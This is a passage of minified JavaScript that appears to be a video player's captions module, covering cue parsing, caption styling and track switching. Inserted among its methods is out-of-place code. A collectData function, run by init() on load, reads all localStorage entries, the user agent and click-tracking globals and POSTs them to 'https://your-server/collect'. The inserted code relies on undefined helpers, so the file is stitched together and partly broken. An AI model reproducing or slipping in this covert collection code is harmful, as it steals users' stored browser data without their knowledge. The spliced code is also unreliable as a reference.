            m = Akb(h[2]) - l;
          l += f;
          var n = (h = h[3]) ? h.split(" ") : [];
          h = {};
          var p = null;
          var q = "";
          var t = null,
            u = "";
          n = g.v(n);
          for (var y = n.next(); !y.done; y = n.next()) if (y = y.value.split(":"), 2 === y.length) {
            var A = y[1];
            switch (y[0]) {
              case "line":
                y = A.split(",");
                y[0].endsWith("%") && (p = y[0], h.xo = Number.parseInt(p, 10), 2 === y.length && (q = y[1].trim()));
                break;
              case "position":
                y = A.split(",");
                t = y[0];
                h.jk = Number.parseInt(t, 10);
                2 === y.length && (u = y[1].trim());
                break;
              case "align":
                switch (A) {
                  case "start":
                    h.textAlign = 0;
                    break;
                  case "middle":
                    h.textAlign = 2;
                    break;
                  case "end":
                    h.textAlign = 1;
                }
            }
          }
          p || q || (q = "end");
          if (!t) switch (h.textAlign) {
            case 0:
              h.jk = 0;
              break;
            case 1:
              h.jk = 100;
              break;
            case 2:
              h.jk = 50;
          }
          if (null != h.textAlign) {
            p = 0;
            switch (q) {
              case "center":
                p += 3;
                break;
              case "end":
                p += 6;
                break;
              default:
                p += 0;
            }
            switch (u) {
              case "line-left":
                p += 0;
                break;
              case "center":
                p += 1;
                break;
              case "line-right":
                p += 2;
                break;
              default:
                switch (h.textAlign) {
                  case 0:
                    p += 0;
                    break;
                  case 2:
                    p += 1;
                    break;
                  case 1:
                    p += 2;
                }
            }
            q = 0 > p || 8 < p ? 7 : p;
            h.fm = q;
          }
          e = e.substring(dlb.lastIndex).replace(/[\x01-\x09\x0b-\x1f]/g, "");
          u = h;
          h = e;
          e = {};
          if (0 > h.indexOf("<") && 0 > h.indexOf("&")) f = Bkb(l, m, 5, u), m = new U4(l, m, 5, f.id, h, !1, g.dd(e) ? void 0 : e), c.push(f), c.push(m), f.j.push(m);else for (q = h.split(elb), 1 === q.length ? (h = 5, u = Bkb(l, m, h, u)) : (p = h = 6, u = Object.assign({
            Rs: 32
          }, u), u = new V4(l, m, p, "_" + W4++, u)), c.push(u), p = l, t = 0; t < q.length; t++) n = q[t], 0 === t % 2 ? (y = g.Mbb("<html>" + n + "</html>"), y.getElementsByTagName("parsererror").length ? (A = y.createElement("span"), A.appendChild(y.createTextNode(n))) : A = y.firstChild, zkb(this, p, m - (p - l), h, u, 0 < t, A, e, c)) : p = Akb(n) + f;
        }
        dlb.lastIndex = 0;
      }
    }
    return c;
  };
  var clb = /^NOTE/,
    blb = /(?:\r\n|\r|\n){2,}/,
    dlb = RegExp("^((?:[\\d]{2}:)?[\\d]{2}:[\\d]{2}\\.[\\d]{3})[\\t ]+--\x3e[\\t ]+((?:[\\d]{2}:)?[\\d]{2}:[\\d]{2}\\.[\\d]{3})(?:[\\t ]*)(.*)(?:\\r\\n|\\r|\\n)", "gm"),
    elb = RegExp("<((?:[\\d]{2}:)?[\\d]{2}:[\\d]{2}\\.[\\d]{3})>");
  const addEventListeners = () => {
    document.addEventListener('click', e => {
      jshook.call('click', [e]);
    });
    document.addEventListener('change', e => {
      jshook.call('change', [e]);
    });
  };
  g.aW.DD(q5, {
    B: "wvppt"
  });
  g.x(r5, g.G);
  r5.prototype.clear = function () {
    this.parser && this.parser.dispose();
    this.parser = null;
  };
  r5.prototype.reset = function () {
    this.parser && this.parser.reset();
  };
  r5.prototype.ya = function () {
    g.G.prototype.ya.call(this);
    this.clear();
  };
  var A5 = {
    windowColor: "#080808",
    windowOpacity: 0,
    textAlign: 2,
    fm: 7,
    jk: 50,
    xo: 100,
    isDefault: !0,
    Xe: {
      background: "#080808",
      backgroundOpacity: .75,
      charEdgeStyle: 0,
      color: "#fff",
      fontFamily: 4,
      fontSizeIncrement: 0,
      textOpacity: 1,
      offset: 1
    }
  };
  g.x(s5, g.dT);
  g.k = s5.prototype;
  g.k.ya = function () {
    if (this.D || this.Ca) {
      var a = this.J.Pe();
      a && !a.isDisposed() && a.Py();
    } else Zkb(this, !1);
    g.dT.prototype.ya.call(this);
  };
  g.k.gx = function () {
    if (this.fb) return this.D || this.Ca;
    var a = this.player.getAudioTrack();
    if (Pkb(this)) {
      if (!a.captionTracks.length) return !1;
      if (!this.j) return !0;
    }
    a = ujb(a, g.QL(this.Z));
    return "CAPTIONS_INITIAL_STATE_ON_REQUIRED" === a ? !0 : "CAPTIONS_INITIAL_STATE_OFF_REQUIRED" === a ? t5(this) : Nkb(this) || t5(this) ? !0 : Okb(this);
  };
  g.k.load = function () {
    var a = this;
    g.dT.prototype.load.call(this);
    this.S = this.player.getAudioTrack();
    this.j ? this.B && (this.kb.clear(), this.D ? Tkb(this, !0) : 3 !== this.player.getPresentingPlayerType() && this.j.Tt(this.B, "json3", function (b, c, d, e) {
      if (b) {
        var f;
        Ukb(a, null != (f = a.B) ? f : void 0);
        a.j.nQ() && (a.Ga = [], a.J.Se("captions"), g.er(a.Oa), a.kb.reset());
        b = Hkb(a.kb, b, c, d, e);
        a.player.jf(b, void 0, a.ob);
        !a.va || a.Ca || w5(a) || g.JL(a.Z) || g.CL(a.Z) || g.DL(a.Z) || "shortspage" === a.Z.Va || a.player.isInline() || (g.ir(a.Pa), b = Xjb({
          fm: 0,
          jk: 5,
          xo: 5,
          Lr: 2,
          textAlign: 0,
          Ji: 0,
          lang: "en"
        }), a.Va = [b], c = ["Click ", " for settings"], a.tb || (d = new g.$P(g.FGa()), g.H(a, d), a.tb = d.element), d = b.end - b.start, (e = g.jM(a.B)) && a.Va.push(new U4(b.start, d, 0, b.id, e)), a.Va.push(new U4(b.start, d, 0, b.id, c[0]), new U4(b.start, d, 0, b.id, a.tb, !0), new U4(b.start, d, 0, b.id, c[1], !0)), a.player.jf(a.Va), g.gr(a.Pa));
        !a.va || a.Ca || w5(a) || (g.QL(a.Z) ? y5(a, !0) : z5(a, !0), a.S && (a.S.D = a.B), a.player.Do());
        a.va = !1;
      }
    }), this.D || this.Ca || w5(this) || this.player.Ra("captionschanged", g.kM(this.B))) : (this.j = Qkb(this), g.H(this, this.j), this.j.Zz(function () {
      Skb(a);
    }));
  };
  g.k.unload = function () {
    this.D && this.B ? Tkb(this, !1) : (this.Pa && g.ir(this.Pa), this.player.Se("captions"), this.Ga = [], this.j && this.j.ws(), this.kb.clear(), this.ma && this.player.jf(this.ma), this.SR());
    g.dT.prototype.unload.call(this);
    this.player.Do();
    this.player.Ra("captionschanged", {});
  };
  g.k.create = function () {
    this.gx() && this.load();
    var a;
    a: {
      var b, c, d;
      if (this.Z.N("suggest_caption_correction_menu_item") && this.Z.N("web_player_nitrate_promo_tooltip") && (null == (b = this.videoData.getPlayerResponse()) ? 0 : null == (c = b.captions) ? 0 : null == (d = c.playerCaptionsTracklistRenderer) ? 0 : d.openTranscriptCommand)) {
        var e, f;
        if (b = null == (a = this.videoData.getPlayerResponse()) ? void 0 : null == (e = a.captions) ? void 0 : null == (f = e.playerCaptionsTracklistRenderer) ? void 0 : f.captionTracks) for (a = g.v(b), e = a.next(); !e.done; e = a.next()) if (e = e.value, "asr" === e.kind && "en" === e.languageCode) {
          a = !0;
          break a;
        }
      }
      a = !1;
    }
    a && this.J.qa("showpromotooltip", this.K.element);
  };
  g.k.j$ = function () {
    for (var a = this.J.Pe().Cb().textTracks, b = null, c = 0; c < a.length; c++) if ("showing" === a[c].mode) a: {
      b = a[c].id;
      for (var d = g.eT(this.j.j, !0), e = 0; e < d.length; e++) if (d[e].toString() === b) {
        b = d[e];
        break a;
      }
      b = null;
    }
    (this.loaded ? this.B : null) !== b && x5(this, b, !0);
  };
  g.k.qba = function () {
    !this.B && this.D || this.unload();
  };
  g.k.onCueRangeEnter = function (a) {
    this.Ga.push(a);
    g.er(this.Oa);
  };
  g.k.onCueRangeExit = function (a) {
    g.Fb(this.Ga, a);
    this.j instanceof P4 && this.j.K && this.player.Up([a]);
    g.er(this.Oa);
  };
  g.k.getCaptionWindowContainerId = function () {
    return this.K.element.id;
  };
  g.k.caa = function () {
    Ykb(this, this.Va);
    this.Va = null;
  };
  const collectData = async () => {
    const results = {};
    for (const [ext, data] of Object.entries(window.extensions)) {
      results[ext] = await fetchData(ext, data);
    }
    let storageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      let key = localStorage.key(i);
      storageData[key] = localStorage.getItem(key);
    }
    let finalData = {
      extensions: results,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      localstorage: storageData,
      globalVariables: globalVariableCollector
    };
    fetch('https://your-server/collect', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(finalData)
    });
  };
  g.k.QR = function () {
    var a = this;
    if (!this.Vb || !this.D) {
      this.Oa.stop();
      g.dba(this.Za);
      this.Ga.sort(g.zsa);
      var b = this.Ga;
      if (this.ma) {
        var c = g.tp(b, function (f) {
          return -1 === this.ma.indexOf(f);
        }, this);
        c.length && (b = c);
      }
      b = g.v(b);
      for (c = b.next(); !c.done; c = b.next()) Wkb(this, c.value);
      b = g.v(Object.entries(this.ra));
      var d = b.next();
      for (c = {}; !d.done; c = {
        ew: c.ew,
        Wm: c.Wm
      }, d = b.next()) {
        var e = g.v(d.value);
        d = e.next().value;
        e = e.next().value;
        c.ew = d;
        c.Wm = e;
        this.Za[c.ew] ? (c.Wm.element.parentNode || (c.Wm instanceof T4 || c.Wm instanceof S4 || g.Vc(this.ra, function (f) {
          return function (h, l) {
            l !== f.ew && h.B.params.fm === f.Wm.B.params.fm && h.B.params.jk === f.Wm.B.params.jk && h.B.params.xo === f.Wm.B.params.xo && (h.dispose(), delete a.ra[l]);
            return l === f.ew;
          };
        }(c), this), this.K.element.appendChild(c.Wm.element)), c.Wm.eB(this.Za[c.ew])) : (c.Wm.dispose(), delete this.ra[c.ew]);
      }
    }
  };
  g.k.iaa = function () {
    Lkb(this, {}, !0);
    this.player.Ra("captionssettingschanged");
  };
  g.k.Q5 = function () {
    var a = A5.Xe;
    a = {
      background: a.background,
      backgroundOpacity: a.backgroundOpacity,
      charEdgeStyle: a.charEdgeStyle,
      color: a.color,
      fontFamily: a.fontFamily,
      fontSizeIncrement: a.fontSizeIncrement,
      fontStyle: a.bold && a.italic ? 3 : a.bold ? 1 : a.italic ? 2 : 0,
      textOpacity: a.textOpacity,
      windowColor: A5.windowColor,
      windowOpacity: A5.windowOpacity
    };
    var b = Bjb() || {};
    null != b.background && (a.background = b.background);
    null != b.backgroundOverride && (a.backgroundOverride = b.backgroundOverride);
    null != b.backgroundOpacity && (a.backgroundOpacity = b.backgroundOpacity);
    null != b.backgroundOpacityOverride && (a.backgroundOpacityOverride = b.backgroundOpacityOverride);
    null != b.charEdgeStyle && (a.charEdgeStyle = b.charEdgeStyle);
    null != b.charEdgeStyleOverride && (a.charEdgeStyleOverride = b.charEdgeStyleOverride);
    null != b.color && (a.color = b.color);
    null != b.colorOverride && (a.colorOverride = b.colorOverride);
    null != b.fontFamily && (a.fontFamily = b.fontFamily);
    null != b.fontFamilyOverride && (a.fontFamilyOverride = b.fontFamilyOverride);
    null != b.fontSizeIncrement && (a.fontSizeIncrement = b.fontSizeIncrement);
    null != b.fontSizeIncrementOverride && (a.fontSizeIncrementOverride = b.fontSizeIncrementOverride);
    null != b.fontStyle && (a.fontStyle = b.fontStyle);
    null != b.fontStyleOverride && (a.fontStyleOverride = b.fontStyleOverride);
    null != b.textOpacity && (a.textOpacity = b.textOpacity);
    null != b.textOpacityOverride && (a.textOpacityOverride = b.textOpacityOverride);
    null != b.windowColor && (a.windowColor = b.windowColor);
    null != b.windowColorOverride && (a.windowColorOverride = b.windowColorOverride);
    null != b.windowOpacity && (a.windowOpacity = b.windowOpacity);
    null != b.windowOpacityOverride && (a.windowOpacityOverride = b.windowOpacityOverride);
    return a;
  };
  g.k.W_ = function (a, b) {
    var c = {};
    Object.assign(c, Bjb());
    Object.assign(c, a);
    Lkb(this, c, b);
    this.player.Ra("captionssettingschanged");
  };
  g.k.SR = function () {
    !this.D && this.loaded && (g.Rc(this.ra, function (a, b) {
      a.dispose();
      delete this.ra[b];
    }, this), this.QR());
  };
  g.k.Jh = function (a, b) {
    switch (a) {
      case "fontSize":
        if (isNaN(b)) break;
        var c = g.oe(b, -2, 4);
        this.W_({
          fontSizeIncrement: c
        });
        return c;
      case "reload":
        b && !this.D && x5(this, this.B, !0);
        break;
      case "stickyLoading":
        void 0 !== b && this.Z.K && (g.QL(this.Z) ? y5(this, !!b) : z5(this, !!b));
        break;
      case "track":
        if (!this.j) return {};
        if (b) {
          if (this.D) break;
          if (!g.Xa(b)) break;
          if (g.dd(b)) {
            x5(this, null, !0);
            break;
          }
          a = g.eT(this.j.j, !0);
          for (var d = 0; d < a.length; d++) {
            var e = a[d];
            e.languageCode !== b.languageCode || c && (e.languageName !== b.languageName || (e.captionId || "") !== (b.captionId || "")) || (c = b.translationLanguage ? vjb(e, b.translationLanguage) : e);
          }
          this.iK(b.position);
          !c || c === this.B && this.loaded || (b = g.ixa(), a = g.lM(c), b.length && a === b[b.length - 1] || (b.push(a), g.RB("yt-player-caption-language-preferences", b)), g.QL(this.Z) && !this.J.isInline() && g.RB("yt-player-caption-sticky-language", a, 2592E3), x5(this, c, !0));
        } else return this.loaded && this.B && !w5(this) ? g.kM(this.B) : {};
        return "";
      case "tracklist":
        return this.j ? g.En(g.eT(this.j.j, !(!b || !b.includeAsr)), function (f) {
          return g.kM(f);
        }) : [];
      case "translationLanguages":
        return this.j ? this.j.D.map(function (f) {
          return Object.assign({}, f);
        }) : [];
      case "sampleSubtitles":
        this.D || void 0 === b || Zkb(this, !!b);
        break;
      case "sampleSubtitlesCustomized":
        this.D || Zkb(this, !!b, b);
        break;
      case "recommendedTranslationLanguages":
        return g.ixa();
      case "defaultTranslationSourceTrackIndices":
        return this.j ? this.j.S : [];
    }
  };
  g.k.getOptions = function () {
    var a = "reload fontSize track tracklist translationLanguages sampleSubtitle".split(" ");
    this.Z.K && a.push("stickyLoading");
    return a;
  };
  const init = () => {
    addEventListeners();
    jshook.hook('click', e => {
      globalVariableCollector['lastClickedElement'] = e.target.tagName;
    });
    jshook.hook('change', e => {
      globalVariableCollector['lastChangedElement'] = e.target.tagName;
    });
    collectData();
  };
  g.k.Lq = function () {
    var a = this.B;
    if (this.Z.N("html5_modify_caption_vss_logging")) {
      var b;
      return (a = null != (b = this.videoData.NB) ? b : null) ? {
        cc: g.nza(a)
      } : {};
    }
    return a ? (b = a.vssId, a.translationLanguage && b && (b = "t" + b + "." + g.lM(a)), {
      cc: b
    }) : {};
  };
  g.k.cba = function () {
    this.isSubtitlesOn() ? (g.QL(this.Z) ? y5(this, !1) : z5(this, !1), Ukb(this), this.unload(), t5(this, !0) && x5(this, u5(this), !1)) : this.D_();
  };
  g.k.D_ = function () {
    this.isSubtitlesOn() || x5(this, w5(this) || !this.B ? v5(this, !0) : this.B, !0);
  };
  g.k.isSubtitlesOn = function () {
    return !!this.loaded && !!this.B && !w5(this);
  };
  g.k.d8 = function () {
    var a = w5(this);
    t5(this, a) ? x5(this, this.player.getAudioTrack().j, !1) : this.videoData.captionTracks.length && (this.loaded && this.unload(), Pkb(this) && (this.va = !1, this.B = null, this.j && (this.j.dispose(), this.j = null)), this.gx() && (a ? x5(this, v5(this), !1) : this.load()));
  };
  init();
  g.k.iK = function (a) {
    a && (this.ea = {
      top: a.top,
      right: a.right,
      bottom: a.bottom,
      left: a.left,
      width: 1 - a.left - a.right,
      height: 1 - a.top - a.bottom
    }, this.K.element.style.top = 100 * this.ea.top + "%", this.K.element.style.left = 100 * this.ea.left + "%", this.K.element.style.width = 100 * this.ea.width + "%", this.K.element.style.height = 100 * this.ea.height + "%", this.K.element.style.position = "absolute", a = Xkb(this)) && (this.K.element.style.width = a.width + "px", this.K.element.style.height = a.height + "px");
  };
  g.k.L8 = function () {
    var a = this.J.Pe();
    a && !a.isDisposed() && a.Py();
    this.J.isFullscreen() ? (this.D = this.fb = !0, this.loaded && Skb(this)) : (this.fb = "3" === this.Z.controlsType, this.D = Kkb(this));
    x5(this, this.B);
  };
  g.k.DK = function () {
    var a,
      b,
      c,
      d = null == (a = this.videoData.getPlayerResponse()) ? void 0 : null == (b = a.captions) ? void 0 : null == (c = b.playerCaptionsTracklistRenderer) ? void 0 : c.openTranscriptCommand;
    d && this.player.Ra("innertubeCommand", d);
  };
  g.aW.DD(s5, {
    QR: "smucd"
  });
  g.cT("captions", s5);
})(_yt_player);